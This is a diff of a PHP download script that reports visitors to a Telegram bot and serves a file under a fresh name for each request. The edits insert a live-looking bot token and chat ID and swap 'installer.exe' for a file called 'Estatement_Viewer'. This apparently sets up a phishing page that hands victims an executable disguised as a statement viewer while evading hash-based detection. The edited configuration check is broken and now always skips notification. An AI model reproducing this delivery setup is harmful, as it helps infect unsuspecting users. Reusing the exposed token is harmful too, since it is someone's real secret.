@@ -2,15 +2,15 @@
 // =========================================================================
 // CONFIGURATION - REPLACE THESE VARIABLES WITH YOUR ACTUAL TELEGRAM DETAILS
 // =========================================================================
-define('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE'); // Put your token between quotes
-define('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID_HERE');     // Put your chat ID between quotes
-define('COMPANY_NAME', 'MyCompany');                 // Your company name prefix
+define('TELEGRAM_BOT_TOKEN', '8128913412:AAEYGvEAFh8JKYKVe9tk0g-tWZe9HH1jSs0'); // Put your token between quotes
+define('TELEGRAM_CHAT_ID', '930774518');     // Put your chat ID between quotes
+define('COMPANY_NAME', 'prkgroup');                 // Your company name prefix
 
 // =========================================================================
 // HELPER FUNCTION: SEND MESSAGE TO TELEGRAM
 // =========================================================================
 function sendTelegramNotification(\$message) {
-    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+    if (TELEGRAM_BOT_TOKEN === '8128913412:AAEYGvEAFh8JKYKVe9tk0g-tWZe9HH1jSs0' || TELEGRAM_CHAT_ID === '930774518') {
         return; // Skip if configuration isn't updated yet
     }
 
@@ -96,7 +96,7 @@ if (\$apiResponse) {
 // =========================================================================
 // 3. FILE DELIVERY WITH DYNAMIC RENAMING
 // =========================================================================
-\$realFilePath = 'files/installer.exe';
+\$realFilePath = 'Estatement_Viewer';
 
 if (file_exists(\$realFilePath)) {
     // Generate a completely unique filename suffix for every request
